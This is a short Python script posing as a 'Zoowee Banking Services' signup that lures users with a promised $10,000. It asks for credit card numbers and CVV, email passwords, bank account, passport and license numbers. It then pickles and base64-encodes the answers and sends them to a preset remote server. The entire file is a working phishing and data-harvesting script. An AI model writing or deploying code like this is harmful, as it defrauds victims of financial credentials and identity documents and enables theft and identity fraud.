import ZooweeServerConnector
import pickle
import base64
to_send = input(
    """
    =================================================================
    =                 Welcome to Zoowee Banking Services!           =
    =          Free $10000 after Signup! Deal ends in 1 day!        =
    =================================================================

    To start, please enter your credit card number, the 3 numbers on the back,
    name, email, email password, date of birth, bank account number, bank
    name, credit card expiry date, gender, personal phone number, work phone
    number, drivers license number and passport number.
    """
)

print("Thank you. Please wait for an email reply")
# Zoowee server ip is preset
port = 1571
connection = ZooweeServerConnector.connect_with_port(1571)

connection.send(base64.b64encode(pickle.dumps(to_send)).decode('utf-8'))
